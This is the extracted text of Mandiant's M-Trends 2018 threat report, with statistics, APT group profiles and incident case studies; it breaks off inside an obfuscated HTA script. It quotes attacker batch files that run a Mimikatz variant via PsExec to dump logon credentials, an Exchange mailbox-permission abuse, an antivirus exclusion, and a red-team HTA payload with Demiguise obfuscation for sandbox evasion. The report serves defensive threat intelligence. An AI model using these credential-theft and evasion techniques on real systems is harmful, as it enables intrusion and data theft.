{
    "id": "0394fe8b-4544-4c7f-a242-18efe244b663",
    "created_at": "2022-10-25T16:48:21.143522Z",
    "updated_at": "2025-03-27T02:17:14.540186Z",
    "deleted_at": null,
    "sha1_hash": "3d1758b8642656de16416d5c24020dec3ac1c332",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-05-25T12:38:05Z",
    "file_modification_date": "2021-06-03T11:55:47Z",
    "file_size": 18618299,
    "plain_text": "-----\n\n#### TABLE OF CONTENTS\n\nIntroduction **3**\n\n2017 By The Numbers **4**\n\nNewly Named APT Groups **10**\n\nIran State-Sponsored Espionage **18**\n\nHidden Threats Remain in Legacy Systems **22**\n\nOnce a Target, Always a Target **24**\n\nRed Teaming for Security Effectiveness **26**\n\nCyber Security Skills Gap – The Invisible Risk **38**\n\nEnduring Trends in Security Fundamentals **42**\n\nPredictions for 2018 **48**\n\nConclusion **50**\n\n\n#### TABLE OF CONTENTS\n\nIntroduction\n\n2017 By The Numbers\n\nNewly Named APT Groups\n\nIran State-Sponsored Espionage\n\nHidden Threats Remain in Legacy Systems\n\nOnce a Target, Always a Target\n\nRed Teaming for Security Effectiveness\n\nCyber Security Skills Gap – The Invisible Risk\n\nEnduring Trends in Security Fundamentals\n\nPredictions for 2018\n\nConclusion\n\n\n-----\n\n#### INTRODUCTION\n\nIn this M-Trends 2018 report, we look at some of the latest trends\nidentified during the October 1, 2016 to September 30, 2017 reporting\nperiod, as revealed through incident response investigations by\nMandiant, a FireEye company.\n\n\nWhen it comes to detecting compromises, organizations\nappear to be getting better at discovering breaches\ninternally, as opposed to being notified by law enforcement\nor some other outside source. This is important because\nour data shows that incidents identified internally tend\nto have a much shorter dwell time. However, the global\nmedian dwell time from compromise to discovery is up\nfrom 99 days in 2016 to 101 days in 2017.\n\nIn this year’s report, we explore some longer-term trends,\nmany of which have evolved. We look at organizations that\nhave been targeted or re-compromised after remediating\na previous attack, a topic we first discussed in M-Trends\n_2013. We also examine the widening cyber security skills_\ngap and the rising demand for skilled personnel capable\nof meeting the challenges posed by today’s more\nsophisticated threat actors.\n\n\nWe take a detailed look at a Mandiant Red Team Assessment\nto explore how we leverage sophisticated attacker tactics,\ntechniques and procedures (TTPs) in simulated attacks to\nshow organizations what they need to do to stay ahead of\nthose threats. We also provide examples of where we saw\nattackers exploit weaknesses in an organization’s detection\nand prevention controls.\n\n_M-Trends 2018 can arm security teams with the knowledge_\nthey need to defend against today’s most often used cyber\nattacks, as well as lesser seen and emerging threats.\n\nThe information in this report has been sanitized to protect\nidentities of victims and their data.\n\n\n-----\n\n### 2017 BY THE NUMBERS\n\nThe statistics reported in\nM-Trends are based on Mandiant\ninvestigations into targeted\nattack activity conducted\nbetween October 1, 2016 and\nSeptember 30, 2017.\n\n\n**Dwell time is the**\nnumber of days from\nfirst evidence of\ncompromise that an\nattacker is present on\na victim network\nbefore detection.\n\nA median represents a\nvalue at the midpoint\nof a sorted data set.\nMandiant continues to\nuse the median value\nover ‘mean’ or ‘average’\nto minimize the impact\nof outlying values.\n\n\n**Global**\nThe global median dwell time of 101 days is essentially unchanged\nfrom last year’s report of 99 days. Organizations across the globe are\nidentifying attacker activity on their own more often than they are being\nnotified by an external source, with 62% of breaches detected internally.\nMandiant’s position in the market would tend to skew our statistics\ntoward organizations who were notified of an incident by a third party,\nsince presumably an organization is less likely to be confident they can\ninvestigate an incident they failed to identify on their own. The fact\nthat more clients self-identify the incidents we investigate for them is\na potential indication that detection capabilities have improved for all\norganizations and not just Mandiant clients.\n\n\n-----\n\n**Asia-Pacific (APAC)**\nThe median dwell time for APAC\nincreased in 2017 to 498 days, from\n172 days in 2016. This dwell time is\nsimilar to the APAC dwell time of 520\ndays reported in M-Trends 2016. It\nis also similar to the first dwell time\nstatistic ever reported by Mandiant,\nwhich was a global dwell time of 417\ndays. With a maximum observed\ndwell time of 2,085 days, attackers\nin APAC are often able to maintain\naccess in compromised organizations\nfor far too long.\n\n\n**Americas**\nThe Americas median dwell time\ndecreased slightly from 99 days in\n2016 to 75.5 days in 2017.\n\n\n**Europe, the Middle East and Africa**\n**(EMEA)**\nThe median dwell time for EMEA\nin 2017 was 175 days, up from 106\ndays in 2016. We attribute this to\nincreased notification programs by\nnational law enforcement. These\nhave uncovered attacks dating back\na significant period of time, many of\nwhich involved active attackers in\nthe target environment at the time\nof notification.\n\n\n-----\n\n###### Organizations Investigated By Mandiant in 2017, By Industry\n\n**Industry** **Americas** **APAC** **EMEA** **Global**\n\nBusiness and Professional Services 18% 10% 12% 16%\n\nEnergy 5% 2% 7% 5%\n\nEntertainment and Media 11% 7% 5% 10%\n\nFinancial 17% 39% 24% 20%\n\nGovernment 6% 7% 18% 8%\n\nHealthcare 12% 2% 2% 9%\n\nHigh Tech 9% 10% 7% 8%\n\nRetail and Hospitality 10% 2% 4% 8%\n\nOther 12% 20% 22% 15%\n\n\n-----\n\n###### Median Dwell Time, By Region\n\n\n1100\n\n1000\n\n\n900\n\n800\n\n\n700\n\n\n600\n\n500\n\n\n400\n\n300\n\n\n200\n\n100\n\n\n0\n\n400\n\n|1088|Col2|Col3|\n|---|---|---|\n||||\n|KEY Internal Discovery|||\n||External Notification||\n|All Notification|||\n||||\n|498|||\n||||\n|320.5 305|||\n|186 175|||\n|124.5 101 75.5|||\n|57.5 42.5 24.5|||\n\n\n416\n\n\n**GLOBAL** **AMERICAS** **EMEA** **APAC**\n\n###### Median Dwell Time, By Year\n\n\n350\n\n300\n\n\n250\n\n200\n\n\n150\n\n100\n\n\n50\n\n0\n\n\n2011 2012 2013 2014 2015 2016 2017\n\n**Year**\n\n\n-----\n\n**Organizations detected a compromise**\nthemselves in 62% of the cases that\nMandiant worked in 2017. Organizations in\nthe United States fared the best with 64% of\ncases detected by the organization. While\nthis is trending in the right direction, it still\nshows that too many organizations are not\naware that they have been compromised\nwithout external assistance.\n\n\n###### GLOBAL\n Notification By Source\n\n\n-----\n\n###### Global Dwell Time Distribution\n\n\n**The global median dwell time is**\n101 days. However, actual global\ndwell times vary significantly,\nranging from less than one week\nto over 2,000 days.\n\n# 101\n\n###### DAYS\n\n\n**Percentage of investigations**\n\n\n-----\n\n### NEWLY NAMED APT GROUPS\n\n\nFireEye tracks thousands of threat actors, but pays\nspecial attention to state-sponsored attackers who\ncarry out advanced persistent threat (APT) attacks.\nUnlike many cyber criminals, APT attackers often\npursue their objectives over months or years. They\nadapt to a victim organization’s attempts to remove\nthem from the network and frequently target the\nsame victim if their access is lost.\n\n\nFireEye tracks more than a thousand uncategorized\nattackers and only promotes a TEMP group to a named APT\ngroup when we have confidence surrounding their specific:\n\nSponsoring nation\n\nTactics, techniques, and procedures (TTPs)\n\nTarget profile\n\nAttack motivations\n\nIn 2017, FireEye promoted four attackers from previously\ntracked TEMP groups to APT groups.\n\n\n-----\n\n###### APT32\n March 20, 2017\n\n\nSince at least 2014, APT32, also known as the OceanLotus\nGroup, has targeted foreign corporations with investments\nin Vietnam, foreign governments, journalists, and\nVietnamese dissidents. Evidence also suggests that APT32\nhas targeted network security and technology infrastructure\ncorporations with connections to foreign investors.\n\nDuring a recent campaign, APT32 leveraged social\nengineering emails with Microsoft ActiveMime file\nattachments to deliver malicious macros. Upon execution,\nthe initialized file typically downloaded malicious\npayloads from a remote server.\n\n\nFireEye asesses that APT32 actors may be aligned with the\nnational interests of Vietnam. We believe recent activity\ntargeting private interests in Vietnam suggests that APT32\nposes a threat to companies doing business or preparing\nto invest in the country. While the specific motivation for\nthis activity remains opaque, it could ultimately erode\ntargeted organizations’ competitive advantage.\n\n\n-----\n\n###### APT33\n August 21, 2017\n\nSince at least 2013, the Iranian threat group FireEye tracks as\nAPT33 has carried out a cyber espionage operation to collect\ninformation from defense, aerospace and petrochemical\norganizations. Additionally, there is evidence to suggest\nAPT33 targeted Saudi Arabian and Western organizations\nthat provide training, maintenance and support for Saudi\nArabia’s military and commercial fleets.\n\n\n-----\n\nAPT33 leverages a mix of public and non-public tools\n(Fig. 1) and often conducts spear-phishing operations\nusing a built-in phishing module from “ALFA TEaM Shell,”\na publicly available web shell. The use of multiple nonpublic backdoors suggests the group is supported by\nsoftware developers.\n\nDROPSHOT is a notable piece of malware used to deliver\nvariants of the TURNEDUP backdoor. Although we\nhave only observed APT33 use DROPSHOT to deliver\nTURNEDUP, we have identified multiple DROPSHOT\nsamples in the wild that delivered wiper malware we\ncall SHAPESHIFT.[1] The SHAPESHIFT wiper is capable of\nwiping disks and volumes, as well as deleting files. Ties\nto SHAPESHIFT suggest that APT33 may engage in\ndestructive operations or shares tools or development\nresources with an Iranian threat group that conducts\ndestructive operations.\n\n**Figure 1. APT33 TTPs in relation to the attack life cycle.**\n\n\nBoth DROPSHOT and SHAPESHIFT contain Farsilanguage artifacts, which indicates that they may have\nbeen developed by a Farsi language speaker. FireEye has\nnot identified APT33 using SHAPESHIFT, but APT33 is\nthe only group FireEye has seen to use DROPSHOT. The\noverlap between SHAPESHIFT and DROPSHOT indicates\nthat tools ­­— specifically DROPSHOT ­— or development\nresources may be shared among Iranian threat groups,\nor that APT33 may engage in destructive operations.\n\nIn a recent attack, APT33 sent spear-phishing emails to\nworkers in the aviation industry. These emails included\nrecruitment-themed lures and links to malicious HTML\napplication (HTA) files. The HTA files contained job\ndescriptions and links to job postings on popular\nemployment websites. The file would appear to be a\nlegitimate job posting, but the HTA file also contained\nmalicious content that downloaded a custom APT33\nbackdoor from an attacker-controlled domain.\n\n\n-----\n\n###### November 14, 2017\n APT34\n\n\n-----\n\nSince at least 2014, an Iranian threat group tracked by\nFireEye as APT34 has conducted reconnaissance aligned\nwith the strategic interests of Iran. The group conducts\noperations primarily in the Middle East, targeting financial,\ngovernment, energy, chemical, telecommunications and\nother industries. Repeated targeting of Middle Eastern\nfinancial, energy and government organizations leads\nFireEye to assess that those sectors are a primary\nconcern of APT34. The use of infrastructure tied to\nIranian operations, timing and alignment with the national\ninterests of Iran also lead FireEye to assess that APT34\nacts on behalf of the Iranian government.\n\n**Figure 2. APT34 TTPs in relation to the attack life cycle.**\n\n\nAPT34 uses a mix of public and non-public tools\n(Fig. 2) and often uses compromised accounts to conduct\nspear-phishing operations. In July 2017, FireEye observed\nAPT34 targeting an organization in the Middle East using\nthe POWRUNER PowerShell-based backdoor and the\ndownloader BONDUPDATER, which includes a domain\ngeneration algorithm (DGA) for command and control.\nPOWRUNER was delivered using a malicious RTF file\nthat exploited CVE-2017-0199. In November 2017, APT34\nleveraged the Microsoft Office vulnerability CVE-201711882 to deploy POWRUNER and BONDUPDATER less\nthan a week after Microsoft issued a patch.\n\n\n-----\n\n|Col1|Col2|Col3|\n|---|---|---|\n||APT35 December 15, 2017||\n||||\n\n\n###### APT35\n\n December 15, 2017\n\nFireEye has identified APT35 operations dating back\nto 2014. APT35, also known as the Newscaster Team,\nis a threat group sponsored by the Iranian government\nthat conducts long term, resource-intensive operations\nto collect strategic intelligence. APT35 typically targets\nU.S. and the Middle Eastern military, diplomatic and\ngovernment personnel, organizations in the media, energy\nand defense industrial base (DIB), and engineering,\nbusiness services and telecommunications sectors.\n\n\n-----\n\nAPT35 has historically used unsophisticated tools like\nthose listed below in Figure 3. Their complex social\nengineering campaigns, however, employ fake social\nmedia personas with convincing backgrounds that\ninclude supporting details and links to real persons and\norganizations. Many of the fake personas utilized by\nAPT35 claimed to be part of news organizations, which led\nto APT35 being referred to as the Newscaster Team. The\neffort required to establish these networks and online front\norganizations suggests the group is well resourced.\n\nMore recent operations suggest that APT35 has expanded\nboth the scope of its targeting and its employed toolset.\nFrom August 2016 to August 2017, APT35 engaged in\nmultiple operations against a broad range of victims,\nincluding those in the following sectors:\n\n**Figure 3. APT35 TTPs in relation to the attack life cycle.**\n\n\nTelecommunications\n\nBusiness services\n\nEnergy\n\nConstruction and engineering\n\nGovernment\n\nDefense\n\nMedia\n\n\n\n- Steal valid user\ncredentials, including\nsoft token\n\n- Gain access to domain\ncontrollers, Exchange/\nCAS servers\n\n- Alter mailbox access\nrights\n\n- Powershell\n\n\n\n- Access mailboxes\n\n- SoftPerfect Network\nScanner\n\n- SMB Scanning\n\n- Office 365\n\n\n\n- Delete log files\n\n- Delete and overwrite\nfiles\n\n- Stage RAR files in\nlocal folders\n\n- Download Personal\nStorage Table (PST)\nArchive\n\n- Create email\nforwarding rules\n\n\n\n- Phishing\n\n- Valid credentials obtained\nfrom previous compromise\n\n- Password Spray\n\n- Ekton CMS Vulnerability\n\n- Strategic Web\nCompromise\n\n\n\n- Credential Theft\n\n- Webshells, including\nTunna and ASPXSHELLSV\n\n- DRUBOT\n\n- MANGOPUNCH\n\n- HOUSEBLEND\n\n- PUPYRAT\n\n\n-----\n\n## IRAN\n STATE-SPONSORED ESPIONAGE\n\n\n-----\n\nThroughout 2017, Mandiant observed a significant\nincrease in the number of cyber attacks originating\nfrom threat actors sponsored by Iran. While they have\ncaptured notoriety over the past year, especially for their\ndestructive attacks, much of their espionage activity has\ngone unnoticed. Their list of victims currently spans nearly\nevery industry sector and extends well beyond regional\nconflicts in the Middle East.\n\nFor some time, these threat actors were primarily a\nnuisance consisting of a loose collective of patriotic\nhackers who conducted web defacements, distributed\ndenial of service (DDoS) campaigns and occasional\ndestructive malware attacks. Since 2010, post-Stuxnet, Iran\nhas increased its cyber espionage capabilities and is now\noperating at a pace and scale consistent with other nationstate sponsored APT groups.\n\n\nIranian threat actors have compromised a variety of\norganizations, but recently they have expanded their\nefforts in a way that previously seemed beyond their\ngrasp. Today they leverage strategic web compromises\n(SWC) to ensnare more victims, and to concurrently\nmaintain persistence across multiple organizations for\nmonths and sometimes years. Rather than relying on\npublicly available malware and utilities, they develop and\ndeploy custom malware. When they are not carrying\nout destructive attacks against their targets, they are\nconducting espionage and stealing data like professionals.\n\n\n-----\n\n|Col1|Col2|Col3|\n|---|---|---|\n||APT35||\n||||\n\n\nOnce connected to the VPN, APT35 focused on stealing\ndomain credentials from a Microsoft Active Directory\nDomain Controller to allow them to authenticate to the\nsingle-factor VPN and Office 365 instance. The attacker did\nnot deploy additional backdoors to the environment.\n\nDuring the analysis of a compromised domain controller,\nMandiant identified batch files (Fig. 4) that were used to\nsteal credentials and hide attacker activity by performing\nthe following actions:\n\n\n###### APT35\n\n**CASE STUDY: APT35**\nIn early 2017, Mandiant responded to an incident involving\nAPT35 targeting an energy company. The attacker\nused a spear-phishing email containing a link to a fake\nresume hosted on a legitimate website that had been\ncompromised. The resume contained the PUPYRAT\nbackdoor, which communicated with known APT35\ninfrastructure. APT35 also installed BROKEYOLK, a custom\nbackdoor, to maintain persistence on the compromised\nhost. They then proceeded to log directly into the VPN\nusing the credentials of the compromised user.\n\n\n1. Copied a modified variant\n\nof Mimikatz to the remote\nsystem.\n\n\n###### APT35\n\n**CASE STUDY: APT35**\nIn early 2017, Mandiant responded to an incident involving\nAPT35 targeting an energy company. The attacker\nused a spear-phishing email containing a link to a fake\nresume hosted on a legitimate website that had been\ncompromised. The resume contained the PUPYRAT\nbackdoor, which communicated with known APT35\ninfrastructure. APT35 also installed BROKEYOLK, a custom\n\n\n2. Executed Microsoft’s\n\nSysinternal’s PsExec utility\nto deploy and execute\na Windows batch file\ncontaining commands\nto execute the Mimikatz\nvariant on each target\nsystem.\n\n\n3. Copied the contents of\n\nthe Mimikatz output to a\nlocal file, named after the\nremote system.\n\n\n4. Deleted the modified\n\nvariant of Mimikatz from\nthe remote system.\n\n\n**Figure 4. Contents of recovered batch files.**\n\n```\nContents of “run.bat”\ncopy MsMpEng.exe \\\\%1\\C$\\windows\\temp\\MsMpEng.exe\nPsExec.exe \\\\%1 -s -c m.bat -accepteula\nmove \\\\%1\\C$\\Windows\\temp\\temp.dat %1.txt\ndel \\\\%1\\C$\\windows\\temp\\MsMpEng.exe\nContents of “m.bat”\nC:\\windows\\MsMpEng.exe privilege::debug sekurlsa::logonPasswords exit > C:\\windows\\temp\\temp.dat\n\n```\n\n-----\n\nWhile the credential harvesting technique\nwas unsophisticated, it was effective.\nMandiant’s analysis indicated the attacker\nsuccessfully harvested credentials from more\nthan 500 systems within the environment\nusing this technique.\n\nWhile having access to the organization’s\nenvironment, the attacker targeted data\nrelated to entities in the Middle East.\nMandiant has previously observed targeted\nattackers stealing email, but few threat actors\nhave been as successful at this as APT35.\nAdditionally, the attacker’s methodology for\naccessing and stealing email from a victim\norganization adapted to accommodate cloud\nmigration trends as companies moved to offpremises email solutions such as Office 365.\n\nForensic analysis revealed the attacker\nleveraged Microsoft Exchange Client Access\ncmdlets to modify permissions on target\nmailboxes. Exchange has several Client\nAccess cmdlets that are used legitimately by\nExchange administrators for routine tasks\nand maintenance.\n\n\nMandiant observed that the attacker had\ngranted compromised accounts read access\nto hundreds of mailboxes with the “AddMailboxPermission” cmdlet (Fig. 5).\n\nFollowing the assignment of mailbox\npermissions, the attacker authenticated to\nthe victim organization’s Outlook Web Access\n(OWA) portal to access targeted inboxes.\nBy assigning these permissions to a single\naccount, the attacker was able to read, access\nand steal hundreds of emails in a single view.\nThe attacker could also blend into normal\nday-to-day activities of users accessing their\nemail through the OWA portal, and did not\nneed to install any additional malware into the\nenvironment. Ultimately, APT35 had used\naccess to hundreds of mailboxes to read email\ncommunications and steal data related to\nMiddle East organizations, which later became\nvictims of destructive attacks.\n\n\nA cmdlet is a\nlightweight Windows\nPowerShell command.\n\n\n**Figure 5. Example of attacker adding “read” access to target mailbox.**\n\n```\n2018-01-01 01:02:34 EXCHANGESERVER 7872 w3wp#MSExchangePowerShellFrontEndAppPool 68  COMPROMISED_\nACCOUNT  TRUE ManagementShell Add-MailboxPermission -User <AttackerControlledAccount> -AccessRights\n(“FullAccess”) -InheritanceType “All”\n\n```\n\n-----\n\n## HIDDEN THREATS REMAIN IN LEGACY SYSTEMS\n\n###### A case study from Asia Pacific\n\nOrganizations continue to struggle with tracking and\nmaintaining their internet footprint. This case study\nfrom Asia Pacific illustrates the continuation of a\nwell-established trend of exposure and compromise\nof poorly protected and overlooked legacy systems.\n\n\n## HIDDEN THREATS REMAIN IN LEGACY SYSTEMS\n\n\n-----\n\nA large company in Asia was recently the latest\nin a long line of organizations to be compromised\nbecause Remote Desktop Protocol (RDP) is\naccessible from the Internet.\n\nThe breach was identified through the discovery of\nan unauthorized database administrator account\non a billing database server. The company’s internal\ninvestigation uncovered unauthorized RDP logons\nby a local administrator account to a legacy\nweb server. The attacker then connected to and\ntunneled connections through an intermediary\nsystem in the client environment. From the\nintermediary system, the attacker was able to\naccess a database server using a separate database\nadministrator account. The client quickly identified\nand decommissioned the web server and other\nlegacy systems and changed the password of\naccounts used by the attacker.\n\nAt some point during the compromise the client’s\nantivirus software began detecting some of the\nattacker’s password dumping tools, so the attacker\nadded the “C:\\temp\\” directory, which was being\nused as a tool repository, to the list of directories to\nnot be scanned by antivirus software. Configuring the\nantivirus software to ignore the directory “C:\\temp”\ncreated a registry artifact (Fig. 6) that helped identify\nadditional systems compromised by the attacker.\n\nThis case illustrates the risk posed by having the\nRDP accessible from the Internet. Access to RDP is a\ncommon vector used by attackers to gain access to\nenvironments either directly from the Internet or by\nleveraging access they gain through a third-party.\n\n\n**Initial compromise: Mandiant identified evidence of**\nmalicious activity dating back several years, and that\nthe environment had been accessed by more than\none attacker. Mandiant was unable to identify how the\nenvironment was first compromised due to evidence\ndecay.\n\n**Establish foothold: The attacker moved laterally within**\nthe environment and installed a variety of backdoors,\nkeyloggers and network traffic tunnelers, ranging from\npublicly available malware such as Gh0stRAT, Empire,\nand the China Chopper web shell, to some highly\npowerful and non-public malware.\n\n**Escalate privileges: The attacker leveraged credentials**\nobtained from domain controllers and keyloggers\ninstalled on the systems of high-value individuals to\nprovide access to the environment.\n\n**Internal reconnaissance:** The attacker conducted\ninternal reconnaissance using built-in tools and tools\nthat the attacker placed in the environment. Examples\nof the methods used for internal reconnaissance\nincluded:\n\n- PowerShell\n\n- Windows Task Scheduler\n\n- NBTScan\n\n- TCPScan\n\n- Non-public keyloggers\n\n- Non-public screen recorders\n\n**Complete mission: The attacker targeted billing and**\ncustomer information. Mandiant identified evidence\nsuggesting gigabytes of sensitive customer information\nhad been exfiltrated from the network.\n\n\n**Figure 6: Example of the registry artifact that was created by the attacker adding an exclusion for the directory “C:\\temp”.**\n\n\nA large company in Asia was recently the latest\nin a long line of organizations to be compromised\nbecause Remote Desktop Protocol (RDP) is\naccessible from the Internet.\n\nThe breach was identified through the discovery of\nan unauthorized database administrator account\non a billing database server. The company’s internal\ninvestigation uncovered unauthorized RDP logons\nby a local administrator account to a legacy\nweb server. The attacker then connected to and\ntunneled connections through an intermediary\nsystem in the client environment. From the\nintermediary system, the attacker was able to\naccess a database server using a separate database\nadministrator account. The client quickly identified\nand decommissioned the web server and other\nlegacy systems and changed the password of\naccounts used by the attacker.\n\nAt some point during the compromise the client’s\nantivirus software began detecting some of the\nattacker’s password dumping tools, so the attacker\nadded the “C:\\temp\\” directory, which was being\nused as a tool repository, to the list of directories to\nnot be scanned by antivirus software. Configuring the\nantivirus software to ignore the directory “C:\\temp”\ncreated a registry artifact (Fig. 6) that helped identify\nadditional systems compromised by the attacker.\n\nThis case illustrates the risk posed by having the\nRDP accessible from the Internet. Access to RDP is a\ncommon vector used by attackers to gain access to\nenvironments either directly from the Internet or by\nleveraging access they gain through a third-party.\n\n**Figure 6:**\n\n\n**Redacted Eventlog message for a folder added to an allow list**\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Popular AV Program\\AV\\Exclusions\\HeuristicScanning\\Directory\\Client\\3212312312\\\nDirectoryName | C:\\temp\\\n\n\n-----\n\n## ONCE A TARGET,\n###### Always a Target\n\nIn 2013 M-Trends, we looked at organizations that had been targeted or recompromised after remediating a previous attack. Our original data showed\n38 percent of clients were attacked after remediation. Our 2017 data shows\nthat, 56 percent of FireEye managed detection and response customers who\n\nA significant attack is\nattacker activity that were previously Mandiant incident response clients were targets of at least\nmay include data theft, one significant attack in the past 19 months by the same or similarly motivated\ncompromised accounts, attack group.\ncredential harvesting,\nlateral movement and\nspear phishing, which We also found that:\naffects at least 43% of\nour managed detection\nand response customers. 49% 86%\n\nof customers with at least of the time, customers\none significant attack were who have had more than\nsuccessfully attacked again one significant attack have\nwithin one year. also had more than one\n\nunique attacker in their\nenvironment.\n\n\n**Regional Considerations**\nWe find that customers in the APAC region are twice as likely to have experienced multiple incidents from multiple\nattackers, compared to customers in EMEA or North America. Over 91 percent of our APAC customers with at least one\nsignificant attack will have attacker activity within the next year (Fig. 7). Of those customers, 82 percent will have multiple\nattackers identified over the life of their service (Fig. 8).\n\n\n**Figure 7. Customers with one significant attack that experienced**\nanother attack of consequence, by region.\n\n100\n\n90\n\n80 **91%**\n\n70\n\n60\n\n50\n\n40 **47%**\n\n30 **44%**\n\n20\n\n10\n\n0\n\n**AMERICAS** **EMEA** **APAC**\n\n\n**Figure 8. Customers with significant attack from multiple groups,**\nby region.\n\n100\n\n90\n\n80\n\n70 **82%**\n\n60\n\n50\n\n40\n\n30 **38%** **40%**\n\n20\n\n10\n\n0\n\n**AMERICAS** **EMEA** **APAC**\n\n\n-----\n\n**Industry Trends**\nThe top three industries most\nfrequently targeted by multiple\nattackers are high-tech,\ntelecommunications and\neducation (Fig. 9).\n\nThe top three industries with the\nmost significant attacks are financial,\nhigh-tech and healthcare (Fig. 10).\n\nThere is a difference between\nindustries that have been successfully\nattacked by multiple threat groups\nversus industries that are targeted\nmost often. Notably, the high-tech\nindustry is both frequently targeted\nby multiple attackers and also sees\na large number of significant attack\nattempts (Fig. 11).\n\nThis trend highlights the industries\nthat most often have to deal with\nmultiple types of threat actors, each\nwith potentially different missions and\nTTPs to defend against.\n\n- Several industries appear more\n\nadaptive and more rigorous in\ntheir security posture over time.\nAs an example, when we examine\nthe industries that suffer multiple\nsuccessful attacks, separated by\nremediation attempts, we observed\nthat the financial industry was\nninth out of 16 industries. Our\nexperiences suggest the financial\nservices are less likely to succumb\nto subsequent attacks over time.\n\n- Industries that have historically been\n\ntargeted by Chinese based groups\nmove to the top of the “attacked by\nmultiple groups” list.\n\nUnfortunately, if you’ve been\nbreached, our statistics show that you\nare much more likely to be attacked\nand suffer another breach. If you\nhave not taken steps to enhance your\nsecurity posture, you are taking a\nsignificant risk.\n\n\n**Figure 9. Customers targeted by multiple threat groups, by industry.**\n\n|Non-Profit Government Business and Professional Services Transportation and Logistics Other Financial Energy type Biotechnology and Pharmaceuticals Industry Retail and Hospitality Media and Entertainment Healthcare Manufacturing Construction and Engineering Education Telecommunications High Tech|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|\n|---|---|---|---|---|---|---|---|---|---|\n\n\n0\n\n\n2 4 6 8\n\nNumber of different threat groups\n\n\n**Figure 10. Significant attacks on customer industries.**\n\n|Non-Profit Other Media and Entertainment Business and Professional Services Biotechnology and Pharmaceuticals Government Energy type Transportation and Logistics Industry Construction and Engineering Manufacturing Education Telecommunications Retail and Hospitality Healthcare High Tech Financial|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|\n|---|---|---|---|---|---|---|---|---|---|\n\n\n0\n\n\n2 4 6 8 10 11 12 14 16\n\nNumber of significant attacks\n\n\n**Figure 11. Customers with significant attacks from multiple attackers, by industry.**\n\n|Non-Profit Government Business and Professional Services Other Energy Transportation and Logistics Media and Entertainment type Financial Industry Biotechnology and Pharmaceuticals Retail and Hospitality Manufacturing Construction and Engineering Healthcare Education Telecommunications High Tech|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|\n|---|---|---|---|---|---|---|---|---|---|\n\n\n0\n\n\n2 4 6 8\n\n\n-----\n\n## RED TEAMING\n###### for Security Effectiveness\n\nMandiant recently conducted a Red Team Assessment for an\norganization hosting large amounts of personally identifiable\ninformation (PII). The goal of the assessment was to validate the\norganization’s ability to protect their PII. The red team was provided\nwith the organization’s name and no additional architectural\ninformation, making it a black-box assessment.\n\n\n-----\n\nThe red team used open source intelligence (OSINT) to\nidentify the external IP addresses, email addresses and\nphone numbers that constituted the attack surface of the\norganization. After creating a list of target email addresses,\nthe red team launched a phishing campaign using emails\nwith a hyperlink crafted to direct the user to an HTML\nApplication (HTA) payload. The payload launched the\nWindows-native Certutil command, calling back to a\ncommand and control (CnC) server. Three systems were\ncompromised in the initial phishing campaign of 30 users.\n\nOne hour after the phishing campaign started, one of\nthe targeted users reported the phishing email to the\norganization’s abuse mailbox. The security operations\ncenter (SOC) responded to the report and blacklisted the\nfully qualified domain name (FQDN) of the web server\nhosting the HTA payload, but infected workstations\ncontinued to connect to the red team’s CnC server. The\nFQDN of the CnC server was not identified and blocked by\n\n**Figure 12. An HTA file that executes a PowerShell payload.**\n\n\nthe SOC because the HTA payload was designed to bypass\nmanual and automated analysis by using a combination of\nobfuscation and sandbox evasion techniques.\n\nHTA payloads allow the red team to create convincing\nscenarios while delivering a flexible payload through the\npower of Microsoft’s VBScript and JScript languages.\nHTAs also enable red teams to bypass application allow\nlist controls because the native Windows application\nassociated with the “HTA” file extension, mshta.exe, is a\nMicrosoft-signed executable, a file type typically added to\napplication allow lists.\n\nAn unobfuscated HTA payload might run a command line\ncommand by invoking the “Run” method of VBScript’s\nWScript.Shell class (Fig. 12).\n\n```\n<!DOCTYPE html>\n<html>\n    <head>\n        <HTA:APPLICATION ID=”host” BORDER=”thin” BORDERSTYLE=”complex”\nmaximizeButton=”yes” minimizeButton=”yes” scroll=”no”/>\n        <title>Sample</title>\n    </head>\n        <script for=”prize” event=”onClick” language=”VBScript”>\n            Dim notMal\n            Set notMal = CreateObject(“WScript.Shell”)\n            notMal.Run “powershell.exe -e\nVwByAGkAdABlAC0ASABvAHMAdAAgACIAUABXAE4ARQBEACIAOwAgAHIAZQBhAGQALQBoAG8AcwB0AA==”\n        </script>\n    <body>\n        <p>\n            You’re our millionth victim!\n        </p>\n        <p>\n            <form>\n                <input type=”button” value=”Claim my prize!”></input>\n            </form>\n        </p>\n</body>\n</html>\n\n```\n\n-----\n\nThe unobfuscated HTA payload contains many plaintext\nstrings that automated analysis could leverage to\nidentify the HTA file as suspicious. For example, incident\nresponders often monitor for the use of the PowerShell\ncommand, the syntax used to run a PowerShell command,\nand the presence of what appears to be a base64 encoded\ncommand. Creating an obfuscated payload is the simplest\nway to avoid these common detections. Publicly available\ntools, such as NCC Group’s Demiguise[2] can automatically\ncreate obfuscated HTA payloads that can only be decoded\nby the key provided during the obfuscation process.\n\n**Figure 13. Using Demiguise to execute a PowerShell payload.**\n\n\nFigure 13 demonstrates the Demiguise obfuscation process\nused to generate an HTML document that relies on a\nspecific string (in this case, 1.2.3.4) as the key to decrypt the\nHTA payload. In this case, the key is the external IP address\nof the victim organization. This can be obtained from OSINT\nor a previous compromise. The victim must have the same\nexternal IP address to decrypt the payload, effectively\nbypassing sandboxes hosted in a cloud environment.\n\n```\nroot@testbox:̴/git/demiguise#./demiguise.py -k 1.2.3.4 -c “powershell.e\nxe -e VwByAGkAdABlACBASABvAHMAdAAgACIAUABXAE4ARQBEACIA0wAgAHIAZQBhAGQAL\nQBoAG8AcwB0AA==* -o payload.hta -p Outlook.Application\n[*] Generating with key 1.2.3.4\n[*] Will execute: powershell.exe -e VwByAGkAdABlACBASABvAHMAdAAgACIAUAB\nXAE4ARQBEACIA0wAgAHIAZQBhAGQALQBoAG8AcwB0AA==\n[+] HTA file written to: payload.html\nroot@testbox:̴/git/demiguise#\n\n```\n\n2 Available at https://github.com/nccgroup/demiguise.\n\n\n-----\n\nThe resulting payload (Fig. 14) has very few strings that can be detected by automated analysis, and\nthe payload might avoid manual detection if it used a complex key retrieval process.\n\n**Figure 14. An obfuscated payload for the basic PowerShell command.**\n\n```\n<html>\n<body>\n<script>\nfunction zPaLZROx(r,o){for(var 